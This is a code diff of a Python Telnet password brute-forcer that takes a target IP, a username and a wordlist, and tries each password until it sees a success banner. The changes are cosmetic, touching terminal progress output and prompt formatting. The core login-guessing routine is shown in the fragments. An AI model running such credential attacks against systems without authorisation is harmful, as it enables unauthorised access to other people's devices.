@@ -26,12 +26,11 @@ def UpdateTimer(startTime):
         elapsed = time.time() - startTime
         elapsedFmt = time.strftime("%H:%M:%S", time.gmtime(elapsed))
         with stdoutLock:
-            # overwrite the progress line
-            sys.stdout.write(f"\r{progressLine}\n")
-            # write duration on the next line
-            sys.stdout.write(f"Duration: {BOLD}{elapsedFmt}{RESET}")
-            # move cursor back up so next progress update overwrites correctly
-            sys.stdout.write("\033[F")  
+            # move to duration line, clear it, print new duration
+            sys.stdout.write("\r\033[K")  
+            sys.stdout.write(f"Duration: {BOLD}{elapsedFmt}{RESET}\n")
+            # move back up to progress line
+            sys.stdout.write("\033[F")
             sys.stdout.flush()
         time.sleep(1)
 
@@ -54,7 +53,7 @@ def TelnetBruteForce(host, port, username, passwords):
         attempts += 1
         progressLine = f"Attempts: {BOLD}{attempts}/{total}{RESET} | Last: {BOLD}{pwd}{RESET}"
         with stdoutLock:
-            sys.stdout.write(f"\r{progressLine}")
+            sys.stdout.write("\r" + progressLine + "\033[K")
             sys.stdout.flush()
 
         if TryPassword(host, port, username, pwd, successBanner):
@@ -72,15 +71,11 @@ def TryPassword(host, port, username, password, successBanner):
         sock = socket.socket()
         sock.settimeout(5)
         sock.connect((host, port))
-
-        tn = Telnet()
-        tn.sock = sock
-
+        tn = Telnet(); tn.sock = sock
         tn.read_until(b"User:", timeout=5)
         tn.write((username + "\r\n").encode())
         tn.read_until(b"Password:", timeout=5)
         tn.write((password + "\r\n").encode())
-
         time.sleep(0.1)
         output = tn.read_very_eager().decode(errors="ignore")
         tn.close()
@@ -101,7 +96,7 @@ def LoadPasswords(path):
 
 def menu():
     host = input(f"\n{RED}Target IP: {RESET}").strip()
-    username = input(f"{RED}Username : {RESET}").strip()
+    username = input(f"{RED}Username: {RESET}").strip()
     wordlist = input(f"{RED}Wordlist [default: passwords.txt]: {RESET}").strip() or "passwords.txt"
     passwords = LoadPasswords(wordlist)
     TelnetBruteForce(host, DEFAULT_PORT, username, passwords)
@@ -118,7 +113,6 @@ def terminal():
     parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT,
                         help=f"Telnet port (default: {DEFAULT_PORT})")
     args = parser.parse_args()
-
     passwords = LoadPasswords(args.wordlist)
     TelnetBruteForce(args.target, args.port, args.username, passwords)
 
